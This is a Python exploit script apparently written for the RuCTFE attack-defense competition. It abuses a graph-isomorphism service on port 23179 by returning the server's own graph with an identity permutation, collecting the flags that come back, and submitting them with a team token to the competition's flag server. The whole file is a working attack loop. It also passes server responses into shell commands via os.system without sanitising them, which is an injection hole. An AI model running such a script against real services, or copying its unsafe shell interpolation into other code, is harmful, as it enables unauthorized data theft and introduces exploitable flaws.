#!/usr/bin/python3

# yes, we do IO using files.... SSDS are good?

import json 
import os
import sys

token=""

ip=sys.argv[1]

listFN= f"garbage/list{ip}.json"

print(f"started on {ip}")
req_id = "5249410a-3674-4d98-977b-c63de8dd730b"

patrolrequest = {
    "type": "LIST"
}

jsonobj = json.dumps(patrolrequest)
os.system(f"curl -s -d \'{jsonobj}\' -H \"Content-Type: application/json\" -X POST {ip}:23179 > {listFN}")


with open(listFN,mode = 'r', encoding = 'utf-8') as f:
    listjson = json.loads(f.read())

graphids = listjson["ids"]
graphids.reverse()

returnFN=f"garbage/return{ip}.json"

for graphID in graphids:
    patrolrequest = {
        "type": "GET_GRAPH",
        "reqId": req_id,
        "graphId": graphID  # String
    }

    jsonobj = json.dumps(patrolrequest)
    os.system(f"curl -s -d \'{jsonobj}\' -H \"Content-Type: application/json\" -X POST {ip}:23179 >{returnFN}")

    with open(returnFN,mode = 'r', encoding = 'utf-8') as f:
        graphReturn = json.loads(f.read())
    try:
        testkeyerr = graphReturn["graph"]
    except KeyError: 
        print("keyerror")
        continue


    patrolrequest = {
        "type": "SEND_ISO",
        "reqId": req_id,
        "graphId": graphID, # String
        "graph": graphReturn["graph"]
    }

    jsonobj = json.dumps(patrolrequest)
    os.system(f"curl -s -d \'{jsonobj}\' -H \"Content-Type: application/json\" -X POST {ip}:23179 > purge")

    perm=[]
    for x in range(0,1200):
        perm.append(x)

    patrolrequest = {
        "type": "SEND_PERM",
        "reqId": req_id,
        "graphId": graphID, # String
        "perm": perm # int[]

        #"graph": graphReturn["graph"]
    }

    flagfile=f"garbage/flag{ip}"
    jsonobj = json.dumps(patrolrequest)
    for i in range(0, 7):
        os.system(f"curl -s -d \'{jsonobj}\' -H \"Content-Type: application/json\" -X POST {ip}:23179 > {flagfile}")
        with open(flagfile,mode = 'r', encoding = 'utf-8') as f:
            submitresponse = json.loads(f.read())
        os.system(f"echo \"{submitresponse}\" >> flags")
        try:
            print(submitresponse["flag"])
            flag = submitresponse["flag"][:-1]
            os.system(f"curl -s -H 'X-Team-Token: {token}' -X PUT -d '[\"{flag}=\"]' http://monitor.ructfe.org/flags | json_pp")
            continue
        except KeyError:
            continue 
   
    
    

    #print(f"curl -d \'{jsonobj}\' -H \"Content-Type: application/json\" -X POST {ip}:23179")


    #with open("ips",mode = 'r', encoding = 'utf-8') as f:
    #    for ip in f:
    #        ip = ip[:-1]
    #        print(ip)
    #        print(f"curl -d \'{jsonobj}\' -H \"Content-Type: application/json\" -X POST {ip}:23179")
    #        os.system(f"curl -d \'{jsonobj}\' -H \"Content-Type: application/json\" -X POST {ip}:23179")
    #        print("----------")

